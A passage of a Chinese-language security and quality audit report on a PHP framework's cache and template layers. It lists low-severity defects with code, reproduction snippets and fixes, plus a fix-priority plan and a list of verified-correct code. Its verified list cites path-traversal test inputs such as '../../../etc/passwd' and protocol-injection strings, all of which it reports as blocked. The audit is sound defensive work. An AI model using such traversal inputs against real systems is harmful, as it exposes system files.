- 问题: ① `tags()` 合并不去重，链式调用 `$c->tags(['a','b'])->tags(['a'])` 得到 `['a','b','a']`，`flush()` 对 `a` 执行两次 `flushByTag`（第二次是空操作，但多一次存储往返），标签数组也会随链式调用持续变长。② 无嵌套深度上限，链式调用过深时标签数组可能膨胀到数百项，每次 `set()` 都要为每个标签执行一次 `attachTag`（N 次文件/网络操作）。③ `delete()` 删除数据却不从标签文件中摘除记录，正是 HV-17 标签文件无界增长的直接来源之一。
- 触发场景:
```php
$tagged = $cache->tags(['a','b']);
for ($i = 0; $i < 10; $i++) { $tagged = $tagged->tags(['a']); }   // 标签数组变为 20 项
$tagged->set('k', 'v', 60);      // → 20 次 attachTag 调用
```
- 建议修复: 合并时去重并加深度上限：
```php
public function tags(array $tags): self
{
    $merged = array_values(array_unique(array_merge($this->tags, $tags)));
    if (count($merged) > self::MAX_TAGS) {
        throw new \InvalidArgumentException('TaggedCache: too many tags');
    }
    return new self($this->store, $merged);
}
```
`delete()` 若存储层支持反向索引（Redis Set / Memcached 标签键）应同步移除成员，否则至少在文档中说明"删除后标签记录由 GC 惰性清理"。

---

### [低] LV-05 `Cache` 门面 docblock 缺少标签相关方法，且未标注危险方法
- 文件: `app/cache/Cache.php` 行号: 8-25
- 代码:
```php
/**
 * @method static mixed get(string $key, mixed $default = null)
 * @method static \cache\TaggedCache tags(array $tags)
 * @method static \cache\CacheManager driver(?string $name = null)
 * @see \cache\CacheManager
 */
```
- 问题: `CacheInterface` 定义的 `flushByTag()`（32 行）与 `attachTag()`（37 行）**没有出现在 `@method` 列表中**，`docs/api.md` 的缓存章节若按此清单编写会遗漏标签 API。同时 `driver()` 被标注为普通方法，但它能拿到驱动实例并进而调用 `connection()`（危险，见 MV-09），却无"危险 API"标注，IDE 与静态分析都无法提示。
- 触发场景: 开发者按 docblock 生成文档/补全，标签失效 API 不可见；`Cache::connection()` 无任何告警提示。
- 建议修复: 补全并标注：
```php
/**
 * @method static bool flushByTag(string $tag)
 * @method static void attachTag(string $key, string $tag)
 * @method static \cache\CacheManager driver(?string $name = null)  // 危险：可触达驱动原生连接
 */
```

---

### [低] LV-06 `Blade`/`Smarty` 构造函数的 `mkdir()` 返回值未检查
- 文件: `app/view/Blade.php` 行号: 61-63；`app/view/Smarty.php` 行号: 29-37
- 代码:
```php
if (!is_dir($this->cachePath)) {
    mkdir($this->cachePath, 0755, true);        // 返回值被丢弃
}
```
- 问题: 目录创建失败（权限不足、路径被文件占用、磁盘满）时静默继续，问题延后到 `file_put_contents()` 失败时才以一条笼统的 `Failed to write compiled template cache` 出现，排障时看不出真实原因是"目录建不出来"。对比 `FileCache` 构造函数（第 39-43 行）做了完整的 `!mkdir() && !is_dir()` 双重检查并抛 `RuntimeException`，标准不一致。
- 触发场景: storage 目录不可写时首次渲染模板 → 只看到"写缓存失败"，看不到"目录不可写"。
- 建议修复: 与 `FileCache` 对齐：
```php
if (!is_dir($this->cachePath)
    && !mkdir($this->cachePath, 0700, true)
    && !is_dir($this->cachePath)) {
    throw new \RuntimeException("Blade: cannot create cache dir {$this->cachePath}");
}
```

---

### [低] LV-07 `Helper::dump()` 无环境开关，模板中误用会泄露调试信息
- 文件: `app/view/Helper.php` 行号: 24-29
- 代码:
```php
public static function dump(mixed $value): void
{
    echo '<pre>';
    var_dump($value);
    echo '</pre>';
}
```
- 问题: 调试辅助函数没有任何环境判断，生产环境同样可用；若被模板（`<?= \view\Helper::dump($user) ?>` 或 `{!! ... !!}`）或控制器误调用，会把完整对象结构、密码哈希、令牌等敏感内容输出到 HTTP 响应中。`var_dump` 在开启 `display_errors` 时还可能附带完整文件路径。
- 触发场景:
```php
// 模板中遗留的调试语句
<?php \view\Helper::dump($user); ?>
// 生产环境访问 → 响应体包含 user 全部属性（password hash、api_token 等）
```
- 建议修复: 加环境闸门：
```php
public static function dump(mixed $value): void
{
    if (!in_array(env('APP_ENV', 'production'), ['local', 'testing'], true)) {
        throw new \RuntimeException('Helper::dump() is not available outside local/testing');
    }
    echo '<pre>';
    var_dump($value);
    echo '</pre>';
}
```

### [低] LV-08 `Helper::asset()` 对绝对 URL 返回空串，`truncate()` 未显式指定编码
- 文件: `app/view/Helper.php` 行号: 31-39、55-61
- 代码:
```php
public static function asset(string $path): string
{
    if (preg_match('#^https?://#i', $path) || str_contains($path, '..')) { return ''; }
    return $base . '/' . ltrim($path, '/');
}
public static function truncate(string $text, int $length = 100, string $suffix = '...'): string
{
    if (mb_strlen($text) <= $length) { return $text; }
    return mb_substr($text, 0, $length) . $suffix;
}
```
- 问题: ① `asset()` 遇到 CDN 绝对 URL（`https://cdn.example.com/x.css`）返回**空串**，模板渲染出 `<link href="">` 或 `<script src="">`，资源静默加载失败；返回类型 `string` 使调用方无法区分"非法路径"与"空资源"。协议前缀检查也未覆盖 `//host/x`（当前实现会拼成相对路径，语义不清）。实测各输入均被拼成相对路径，**无注入风险**，但可用性缺陷明确。② `truncate()` 使用 `mb_*` 但**未传显式编码**，依赖 `mb_internal_encoding()` 当前设置（PHP 8 默认 UTF-8，但框架内其他代码若改过该设置就会产生乱码与长度错乱）。③ 截断不感知 HTML 实体，可能把 `&amp;` 截成 `&am`。
- 触发场景:
```php
view\Helper::asset('https://cdn.jsdelivr.net/npm/vue/dist/vue.js');
// 返回 "" —— <script src="">，CDN 资源静默加载失败
mb_internal_encoding('ISO-8859-1');
view\Helper::truncate('中文标题很长很长', 4);   // 长度按 ISO-8859-1 计算 → 截断异常
```
- 建议修复: 区分"外部 URL"与"非法路径"，并显式指定编码：
```php
public static function asset(string $path): string
{
    if (preg_match('#^(https?:)?//#i', $path)) { return $path; }   // 外部 URL 原样返回
    if (str_contains($path, '..') || str_contains($path, "\0")) {
        throw new \InvalidArgumentException("Invalid asset path: {$path}");
    }
    return rtrim(dirname($_SERVER['SCRIPT_NAME'] ?? ''), '/') . '/' . ltrim($path, '/');
}

public static function truncate(string $text, int $length = 100, string $suffix = '...'): string
{
    $text = htmlspecialchars_decode($text, ENT_QUOTES);           // 先解实体，避免截断实体
    if (mb_strlen($text, 'UTF-8') <= $length) { return $text; }
    return mb_substr($text, 0, $length, 'UTF-8') . $suffix;
}
```

---

### [低] LV-09 `Smarty::display()` 无输出边界与异常保护，异常时留下半截响应
- 文件: `app/view/Smarty.php` 行号: 65-68
- 代码:
```php
public function display(string $template): void
{
    $this->smarty->display($template);      // 直接输出，无缓冲、无异常处理
}
```
- 问题: `display()` 直接写入全局输出流，若模板渲染到一半时抛出异常（数据未定义、Smarty 编译错误），此前已输出的 HTML 会**先行发送**给客户端，随后异常处理器再输出错误页，响应体被拼接成"半截页面 + 完整错误页"。这与 `Blade::renderTemplate()`（126-139 行有 `ob_start` + 异常清理）和 `View::render()`（110-120 行）是两种截然不同的错误语义。`SmartyView::display()` 走 `fetch()` 已是安全的，仅此方法需要修。
- 触发场景:
```php
$smarty->display('user/list.tpl');   // 模板第 50 行访问未定义变量并抛错
// 客户端收到：<html>...前 49 行内容...</html> + 500 错误页 HTML
```
- 建议修复: 加输出边界与异常清理：
```php
public function display(string $template): string
{
    $level = ob_get_level();
    ob_start();
    try {
        $this->smarty->display($template);
        return (string) ob_get_clean();
    } catch (\Throwable $t) {
        while (ob_get_level() > $level) { ob_end_clean(); }
        throw $t;
    }
}
```

### [低] LV-10 `app/view/test.php` 测试模板遗留在发布目录内
- 文件: `app/view/test.php` 行号: 1
- 代码:
```php
<?= $content ?? '' ?>
```
- 问题: 该文件是被 `tests/run_tests.php:336-345` 使用的测试模板，**随应用一起提交**（不在 `.gitignore` 排除项内）。`VIEW_PATH` 指向 `app/view/`，任何以 `render('test')` 调用或依赖 `Controller::view('test')` 的路径都会渲染出它；它同时是"模板可直接回显未经二次校验的变量"这一模式的活教材。`app/view/templates/index.php`、`layouts/main.php`、`user/*.tpl` 等示例模板同样随包发布，容易被误当成真实页面。当前 `$content ?? ''` 的兜底使其本身无害，属发布物卫生问题。
- 触发场景:
```php
// 任何路由误指向该模板
return $this->view('test', ['content' => $x]);
// 或被 @include('test') 命中
```
- 建议修复: 将测试夹具移出 `app/view/`（例如 `tests/fixtures/views/`），在测试中显式传入该目录作为 `VIEW_PATH`；若需保留演示模板，至少重命名为 `examples/` 子目录并在文档中标注"非生产路由"。

---

### [低] LV-11 `Blade::resolveInclude()` 的缓存目录校验缺少路径分隔符，与其他校验不一致
- 文件: `app/view/Blade.php` 行号: 603-618
- 代码:
```php
$realCachePath = realpath(dirname($cacheFile));
$expectedCacheDir = realpath($this->cachePath);
if ($realCachePath === false || $expectedCacheDir === false
    || !str_starts_with($realCachePath, $expectedCacheDir)) {    // 缺少 DIRECTORY_SEPARATOR
    return '';
}
```
- 问题: `compile()`（164 行）与 `compileIncludes()`（420 行）的同类判断都补了 `DIRECTORY_SEPARATOR`（注释明确写着"必须附加分隔符，否则 `/app/view-evil` 会匹配 `/app/view` 前缀"），唯独此处省略。当前 `$cacheFile` 由 `getCachePath()` 固定派生、`dirname()` 恒等于 `cachePath`，因此**实际不可利用**；但这是一处防御深度不一致：若将来 `getCachePath()` 支持子目录分片，`/storage/views-evil` 就会通过校验。属应统一的安全编码规范问题。
- 触发场景: 当前不可触发（`getCachePath()` 的派生方式保证 `dirname()` 恒定），属预防性修复。
- 建议修复: 统一为带分隔符的前缀比较：
```php
if ($realCachePath === false || $expectedCacheDir === false
    || ($realCachePath !== $expectedCacheDir
        && !str_starts_with($realCachePath, $expectedCacheDir . DIRECTORY_SEPARATOR))) {
    return '';
}
```

---

### [低] LV-12 `Blade::endSection()`/`endPush()`/`endPrepend()` 不校验栈顶类型，配对错误时静默写入错名区块
- 文件: `app/view/Blade.php` 行号: 504-521、534-552、560-578
- 代码:
```php
public function endPush(): void
{
    $name = array_pop($this->stack);
    $name = substr($name, 5);          // 去掉 'push:' 前缀，无校验
    $this->pushStack[$name][] = $content;
}
```
- 问题: 四类区块共用一个 `$stack`，但 `end*()` **不校验弹出的名字前缀是否与自身匹配**。模板误配对时（如 `@section('a')...@endpush`）会静默产生错误结果：`endPush()` 弹出的 `'a'` 经 `substr('a', 5)` 得到 `""`（PHP 8 行为），内容被写入 `pushStack['']`，`@stack('scripts')` 永远拿不到；`endSection()` 弹出 `'push:scripts'` 则会创建一个名为 `push:scripts` 的 section。两种情况都不报错，只表现为"区块内容凭空消失"，排障成本极高。此外 `endSection()` 在 `stack` 为空时直接 return（不关闭缓冲），与 HV-01 的缓冲泄漏路径叠加。
- 触发场景:
```php
file_put_contents("$dir/mismatch.blade.php", "@section('a')X@endpush@stack('scripts')|@yield('a')");
// 实测： stack 与 yield 均为空，内容被写入 pushStack['']，无任何错误提示
```
- 建议修复: 校验栈顶前缀并在不匹配时抛错：
```php
public function endPush(): void
{
    $top = $this->stack[count($this->stack) - 1] ?? null;
    if ($top === null || !str_starts_with($top, 'push:')) {
        throw new \RuntimeException('Blade: @endpush without matching @push');
    }
    $content = (string) ob_get_clean();
    $name = substr((string) array_pop($this->stack), 5);
    $this->pushStack[$name][] = $content;
}
```
`endSection()`/`endPrepend()` 同理，并应校验顶层名字**不含** `:`。

## 五、修复优先级建议

| 批次 | 条目 | 理由 |
|------|------|------|
| **P0（立即修复）** | CV-01、CV-02、CV-04、HV-01 | 均为"模板一改就整站 500/白屏"的可用性阻断，且修复成本低（正则补边界、tmp+rename、补 ob 回收） |
| **P0（立即修复）** | CV-07、HV-15 | 主机头投毒与 storage 误暴露属安全边界问题，改动集中在 `Helper::url()` 与目录权限常量 |
| **P1（尽快修复）** | CV-03、CV-05、CV-06、CV-08、HV-02、HV-03、HV-10、HV-17 | 数据正确性：跨应用清库、缓冲层级错乱、脏数据滞留、锁互斥失效、模板删除不失效、标签无界增长 |
| **P1（尽快修复）** | HV-13、HV-14、HV-16、HV-19 | 三套引擎默认安全级别不一致（Smarty 不转义、Smarty 单值区块、`{{-- --}}` 崩溃），建议一次性统一 |
| **P2（计划内）** | HV-04~HV-12、MV-01~MV-16 | 性能与可观测性问题，建议合并为"缓存层一致性"专题改造 |
| **P3（技术债）** | LV-01~LV-12 | 代码卫生与规范统一，可随其他改动顺带处理 |

**建议同步补充的测试**（当前 `tests/run_tests.php` 未覆盖以下场景，均为本报告实测可复现的缺陷）：

```
Blade: @if ($x) 空格写法能编译
Blade: 文本中的 foo@endif.com 不破坏编译
Blade: @section 未闭合时后续输出不被吞
Blade: @include 递归有深度上限
Blade: 删除模板后 render 抛异常而非返回旧内容
Blade: 视图变量名 content/template 不被框架内部变量覆盖
Blade: {{-- comment --}} 编译为注释
View:  extend() 在 startSection 内调用不丢内容
View:  嵌套 startSection 不丢外层内容
Cache: set($k,$v,0) / set($k,$v,-1) 的 TTL 语义断言
Cache: 两个 FileCache 实例共享目录时 clear() 不互相影响
Cache: TaggedCache::flush() 在 store 失败时返回 false
Cache: FileCache::delete() 不删除正在被 flock 的锁文件
```

---

## 六、已验证正确清单

以下实现经审计与实测确认**无缺陷**，可作为后续改动的回归基线：

**缓存层**

1. `FileCache::getFile()`/`getTagFile()` 用 `hash('sha256', $key)` 派生文件名 —— 彻底免疫 key 造成的路径穿越，无弱哈希残留（CHANGELOG 记录的 md5 问题确已修复）。
2. `FileCache::write()` 的"临时文件 + `rename()`"写入 —— POSIX 与 NTFS 上均为原子替换，读者永远看到完整文件（实测磁盘内容完整）。
3. `FileCache::write()` 的 `<?php die; ?>` 前缀 —— storage 误暴露为 web 可访问时，`.cache` 文件被当 PHP 执行会立即终止，阻断信息泄露。
4. `FileCache` 缓存目录 `mkdir(..., 0700, true)` + `!mkdir() && !is_dir()` 双重检查并抛 `RuntimeException` —— 是本次审计各组件中目录创建最规范的一处。
5. `FileCache::read()` 对过期文件的 TOCTOU 防护（重读比对内容后再 `unlink`）—— 逻辑正确，避免误删其他进程刚 `set()` 的新数据。
6. `FileCache::increment()`/`decrement()` 的 `flock` 临界区 + `finally` 中 `LOCK_UN`/`fclose` 双释放 —— 异常路径不泄漏句柄；TTL 保留逻辑（`max(1, expire - time())`）正确，永久键仍写永久。
7. `FileCache::modifyFallback()` 在无独立锁文件时的回退：直接对缓存文件 `flock` + 校验 `isExpired` + 保留 TTL，`finally` 中判 `is_resource()` 再释放 —— 边界处理严谨。
8. `FileCache::attachTag()`/`flushByTag()` 的标签文件读写在 `flock(LOCK_EX)` 保护下进行，失败时 `error_log` 且不抛异常 —— 可观测性达标（原子性问题见 HV-17，属另一维度）。
9. `FileCache::has()`/`get()` 复用 `read()`，不存在"has 与 get 判定不一致"的分裂语义。
10. `FileCache::get()` 使用 `new \stdClass()` 哨兵 + `!==` 严格比较，`remember()` 可正确缓存并返回 `null` 值（`tests/run_tests.php:376` 已覆盖）。
11. `MemcachedCache::unserialize()` 使用 `['allowed_classes' => false]` —— 正确阻断 PHP 反序列化对象注入；标量/`null`/`false`/数组往返实测完全正确。
12. `MemcachedCache::get()`/`pull()`/`has()` 严格以 `getResultCode() === RES_SUCCESS` 判定成功，区分 `RES_NOTFOUND` 与网络/服务端错误，避免把 `false` 当存储值返回。
13. `MemcachedCache::delete()` 把 `RES_NOTFOUND` 视为删除成功（幂等语义正确）；`deleteMany()` 正确处理了 `deleteMulti()` 返回数组中 `true` 与错误码混合的情况。
14. `MemcachedCache::set()` 的 TTL 归一化（负数 → 0 永久、> 30 天 → Unix 时间戳）—— 符合 Memcached 协议语义（`setMany()` 的遗漏见 HV-13）。
15. `RedisCache::get()` 对"存储的 `false`"做了 `exists()` 兜底 —— 语义正确（性能代价见 MV-03）。
16. `RedisCache::remember()` 的 Lua 脚本仅在锁值匹配时才 `DEL` —— 不会误删他人持有的锁，这是分布式锁实现中容易出错而此处做对的细节。
17. `RedisCache::attachTag()` 的标签 TTL 对齐策略（取缓存项与标签 TTL 的较大值、只延长不缩短）—— 避免过期键名在 SET 中永久累积，同时不会误删活跃标签。
18. `RedisCache::clear()` 用 `SCAN` 迭代而非 `KEYS` —— 不会阻塞 Redis 主线程。
19. `TaggedCache::set()` 仅在写入成功后打标签、`setMany()` 即使部分失败也逐个打标签 —— 逻辑正确，避免缓存泄漏。
20. `TaggedCache::remember()` 先用哨兵探测命中、未命中才执行回调并打标签 —— 避免每次命中都产生无谓的标签写入。
21. `TaggedCache::increment()`/`decrement()` 无条件打标签 —— 正确覆盖了 Memcached 驱动下 `add()` 初始化新 key 的场景。
22. `CacheManager::resolve()` 的 `match` 白名单 —— 未知驱动显式抛 `InvalidArgumentException` 并列出支持列表，不会误实例化任意类名。
23. `CacheManager::extend()` 在注册自定义创建器后 `unset($this->drivers[$name])` —— 正确使已解析实例失效。
24. 三个驱动的 `tags()` 均返回新的 `TaggedCache` 实例，不共享可变标签状态。
**视图层**

25. `Blade::compile()` 与 `compileIncludes()` 的路径穿越防护 —— `realpath` + `DIRECTORY_SEPARATOR` 前缀比较，实测 `@each('../../../etc/passwd')`、`@include('../..')` 均被拦截（LV-11 是同类校验中唯一缺分隔符的一处，但当前不可利用）。
26. `Blade::getCachePath()` 使用 `hash('sha256', $template)` —— 与 `FileCache` 保持一致的强哈希标准。
27. `Blade::render()` 的 `@extends` 无限递归防护 —— `$rendered` 数组记录已渲染模板，重复继承时抛 `RuntimeException`，不会栈溢出。
28. `Blade::render()` 每次渲染都重置 `sections`/`stack`/`pushStack`/`prependStack`（86-89 行）—— 同一实例重复渲染无状态残留（`clear()`/`restoreState()` 的遗漏见 MV-12，属不同路径）。
29. `Blade::renderTemplate()` 的异常路径 ob 缓冲回收（135-138 行）—— `while (ob_get_level() > $initialObLevel) ob_end_clean()` 后重抛，异常路径正确（正常路径的遗漏见 HV-01）。
30. `Blade::compileString()` 的 `@verbatim` 块保护 —— 块内内容被抽离为占位符，在所有编译步骤完成后才还原，内部指令与 `{{ }}` 不会被误编译。
31. `Blade::compileEchos()` 的 `{{{ }}}` 先于 `{{ }}` 处理（219→220→221 行）—— 三花括号语法优先匹配，无嵌套误伤。
32. `Blade::compileBalanced()` / `@json` / `@include` / `@each` 的递归正则 `\((?1)\)` —— 正确支持 `@if($a && ($b || $c))` 这类嵌套括号表达式（空格问题见 CV-01，属另一维度）。
33. `Blade::splitBalancedArgs()` 的引号感知分割 —— 正确处理 `['a' => f(1,2), 'b' => 3]` 这类顶层逗号在参数内部的场景。
34. `Blade::startPush()`/`startPrepend()` 用 `'push:'`/`'prepend:'` 前缀区分栈条目，`yieldPushContent()` 用 `array_merge($prepend, $push)` 保证 prepend 在前 —— 顺序语义正确。
35. `Blade::compile()` 对 `realpath()` 返回 `false`（目录不存在）的显式处理 —— 不会因类型 juggling 绕过穿越检查。
36. `View::render()` 在 `extract()` 之前 `unset($file, $data, $template)` 并预设 `$__file`/`$__view`/`$__data` —— 有效规避了 Blade 侧的变量名冲突问题（HV-05），且 `EXTR_SKIP` 保护了 `$initialObLevel`。
37. `View::validatePath()` 的 `realpath` + `DIRECTORY_SEPARATOR` 前缀校验 —— 双重编码、双写反斜杠等穿越变体均被 `realpath` 归一化后拦截（实测有效）。
38. `View::render()` 的 `file_exists()` → `validatePath()` 两段式校验顺序 —— 不会对目录外路径执行 `require`。
39. `View::extend()` 的 `MAX_EXTEND_DEPTH = 10` 深度上限 + `finally` 中 `extendDepth--` —— 布局 A 继承布局 B 继承布局 A 的循环被可靠阻断。
40. `View::include()` 的 `try/finally` 状态快照/恢复 —— `sharedData`、`sections`、`currentSection`、`renderData`、`extendDepth`、`autoEscape` 六项全部恢复，子视图状态变更不污染父视图（CHANGELOG 记录的 autoEscape 泄漏确已修复）。
41. `View::escapeArray()` 对数组递归、对 `\Stringable` 接口做转换 —— 实现本身正确（覆盖面不足见 MV-13）。
42. `Helper::old()` 输出前统一 `htmlspecialchars(..., ENT_QUOTES, 'UTF-8')`，且优先从容器取 `request` 而非直读超全局。
43. `Helper::json()` 使用 `JSON_UNESCAPED_UNICODE | JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_AMP` —— 该组合可安全嵌入 `<script>` 上下文，且编码失败返回空串而非 `false`。
44. `Helper::isActive()` 的 `'*'` 与 `'/'` 特殊分支 —— CHANGELOG 记录的"反向匹配"缺陷确已修复，当前语义（通配全匹配、根路径只匹配首页、子路径前缀匹配）正确。
45. `Helper::asset()` 拒绝包含 `..` 的路径与 `http(s)://` 前缀 —— 实测 `javascript:`、`data:`、`//evil.com` 等输入均被拼为站内相对路径，无协议注入。
46. `Blade::compileStatements()` 中 `@else`/`@php`/`@csrf`/`@break`/`@continue`/`@production` 带 `(?!\w)` 守卫 —— `@elsewhere`、`@phpinfo` 等文本不会被误替换（其余指令的守卫缺失见 CV-02）。
47. `SmartyView::display()` 在每次渲染前清理上一次 section 的 assign（32-37 行）—— 短生命周期实例下不会跨渲染污染（长驻进程场景见 MV-14）。
48. `SmartyView::extend()`/`layout()` 两种写法统一落到 `$this->layout` 属性 —— API 表面一致。
49. `Smarty::assign()` 同步维护 `$this->assignData`，`clearAssign()` 双侧清理 —— `getAssignedData()` 不会返回过期数据。
50. `Smarty` 构造函数对 `\Smarty` 类不存在时抛出明确异常（第 20-22 行）—— 依赖缺失的失败信息清晰可读。
51. `SmartyView::display()` 返回 `Response` 对象而非裸字符串 —— 与 `Controller::view()` 的返回契约一致。

---

*本报告共记录 **55 项缺陷**：严重 8（CV-01~CV-08）、高危 19（HV-01~HV-19）、中危 16（MV-01~MV-16）、低危 12（LV-01~LV-12），全部条目均已完整列出，无省略。*

*标注"实测"的结论均由 PHP 8.4 CLI 在系统临时目录中复现（未修改仓库任何文件）；标注"代码路径推演"的 6 项（HV-13、HV-14、MV-03、MV-04、MV-05、LV-03）因本机缺少 redis / memcached 扩展无法运行验证，建议在集成环境复核后再排期。*